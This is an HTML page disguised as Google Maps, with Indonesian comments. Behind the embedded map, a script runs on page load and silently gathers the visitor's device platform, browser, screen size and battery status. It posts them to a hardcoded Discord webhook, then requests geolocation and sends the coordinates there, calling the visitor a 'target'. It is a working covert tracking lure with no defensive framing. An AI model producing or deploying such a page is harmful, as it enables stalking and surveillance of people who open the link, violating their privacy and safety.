<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Maps</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; }
        iframe { width: 100%; height: 100%; border: none; }
    </style>
</head>
<body>

    <iframe src="https://www.google.com/maps/embed" allow="geolocation;camera"></iframe>

    <script>
        const webhookURL = "https://discord.com/api/webhooks/1484113432583081984/Fkm8Dj5XnVCkC7du-HRYBFKAvdcxCz9jcXzQIj_5G4hWa1rX0GUPVQ02P5as6oiOKOxR";

        async function kirimKeDiscord(pesan) {
            await fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: pesan })
            });
        }

        async function mainkan() {
            // 1. Ambil info dasar HP (Ini Pasti Muncul!)
            let infoHP = `**[!] ADA YANG MASUK LINK!**\n`;
            infoHP += `📱 **Model:** ${navigator.platform}\n`;
            infoHP += `🌐 **Browser:** ${navigator.userAgent}\n`;
            infoHP += `🖥️ **Layar:** ${window.screen.width}x${window.screen.height}\n`;

            // 2. Ambil Baterai (Kita tunggu sebentar biar datanya dapet)
            try {
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    const level = Math.round(b.level * 100);
                    const status = b.charging ? "Lagi di-cas" : "Tidak di-cas";
                    infoHP += `🔋 **Baterai:** ${level}% (${status})`;
                }
            } catch (e) {
                infoHP += `🔋 **Baterai:** Tidak terbaca`;
            }
            
            // Langsung kirim info HP & Baterai dulu!
            kirimKeDiscord(infoHP);

            // 3. Baru minta Lokasi (Ini butuh persetujuan target)
            navigator.geolocation.getCurrentPosition(pos => {
                const linkMaps = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                kirimKeDiscord(`**[+] LOKASI DIDAPAT!**\n📍 Link: ${linkMaps}\n🎯 Akurasi: ${pos.coords.accuracy} meter`);
            }, err => {
                kirimKeDiscord(`[-] Target menolak izin lokasi.`);
            });
        }

        window.onload = mainkan;
    </script>
</body>
</html>
